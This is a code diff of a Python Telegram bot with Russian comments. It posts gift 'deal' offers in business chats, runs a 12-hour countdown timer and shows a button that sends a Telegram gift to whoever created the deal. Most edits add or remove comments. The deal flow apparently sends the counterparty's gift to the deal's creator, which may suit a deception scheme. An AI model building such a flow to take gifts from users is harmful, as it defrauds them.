@@ -27,7 +27,7 @@ DEALS_FILE = "pending_deals.json"
 LOG_FILE = "messages.log"
 
 DEAL_LIFETIME_HOURS = 12
-UPDATE_INTERVAL = 60  # секунд
+UPDATE_INTERVAL = 60
 
 
 def load_json(path: str) -> dict:
@@ -60,7 +60,6 @@ def log_message(chat_id: int, username: str | None, text: str):
 
 
 def human_left(seconds: int) -> str:
-    """Преобразует секунды в 'X ч Y мин' / 'X h Y min'."""
     if seconds <= 0:
         return "0 мин"
     h = seconds // 3600
@@ -117,6 +116,9 @@ def offer_kb(lang: str) -> InlineKeyboardMarkup:
 
 
 def deal_kb(lang: str, target_username: str) -> InlineKeyboardMarkup:
+    """
+    target_username — тот, кто СОЗДАЛ сделку.
+    """
     t = TEXTS[lang]
     gift_url = f"tg://send_gift?to={target_username}"
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -194,20 +196,16 @@ BUY_RE = re.compile(
 # ---------- Живой таймер ----------
 
 async def live_timer(chat_id: int, message_id: int, expire_ts: float):
-    """
-    Каждые 60 секунд обновляет сообщение, пока сделка активна.
-    """
     while True:
         await asyncio.sleep(UPDATE_INTERVAL)
 
         deal = pending_deals.get(chat_id)
         if not deal:
-            print(f"[TIMER] Сделка {chat_id} больше не активна, останавливаю таймер")
+            print(f"[TIMER] Сделка {chat_id} больше не активна")
             return
 
         seconds_left = int(expire_ts - datetime.datetime.now().timestamp())
         if seconds_left <= 0:
-            # Сделка истекла
             lang = deal.get("lang", "ru")
             try:
                 await bot.edit_message_text(
@@ -303,12 +301,12 @@ async def on_business_message(message: types.Message):
     gift_name = parse_gift_name(link)
     order_id = gen_order_id()
 
-    # Время окончания — 12 часов от текущего момента
     now = datetime.datetime.now()
     expire_dt = now + datetime.timedelta(hours=DEAL_LIFETIME_HOURS)
     expire_ts = expire_dt.timestamp()
     time_left = human_left(DEAL_LIFETIME_HOURS * 3600)
 
+    # ⚠️ Менеджер = ТОТ, КТО СОЗДАЛ СДЕЛКУ
     seller_username = username or ""
 
     pending_deals[chat_id] = {
@@ -317,7 +315,7 @@ async def on_business_message(message: types.Message):
         "currency_display": currency_disp,
         "gift_name": gift_name,
         "buyer_username": username or "",
-        "target_username": seller_username,
+        "target_username": seller_username,    # ⚠️ создатель
         "order_id": order_id,
         "connection_id": connection_id,
         "lang": lang,
@@ -341,7 +339,6 @@ async def on_business_message(message: types.Message):
         )
         print(f"[BUSINESS SEND] ✅ Отправлено в чат {chat_id}, msg_id={sent.message_id}")
 
-        # ⚠️ Запускаем живой таймер
         asyncio.create_task(live_timer(chat_id, sent.message_id, expire_ts))
         print(f"[TIMER] ✅ Таймер запущен для {chat_id}")
     except Exception as e:
@@ -389,9 +386,9 @@ async def on_accept(call: types.CallbackQuery):
     currency = deal.get("currency_display", "⭐ Stars")
     t = TEXTS[lang]
 
+    # ⚠️ Менеджер = создатель сделки
     target_username = deal.get("target_username", "")
 
-    # считаем оставшееся время для второго сообщения
     seconds_left = int(deal.get("expire_ts", 0) - datetime.datetime.now().timestamp())
     time_left = human_left(seconds_left)
 
@@ -408,10 +405,10 @@ async def on_accept(call: types.CallbackQuery):
                 currency=currency,
                 buyer_username=deal["buyer_username"],
                 gift_name=deal["gift_name"],
-                gift_username=target_username,
+                gift_username=target_username,   # ⚠️ @создатель в тексте
                 time_left=time_left,
             ),
-            reply_markup=deal_kb(lang, target_username),
+            reply_markup=deal_kb(lang, target_username),   # ⚠️ ссылка на создателя
         )
     except Exception as e:
         print(f"[SEND ERROR] {e}")
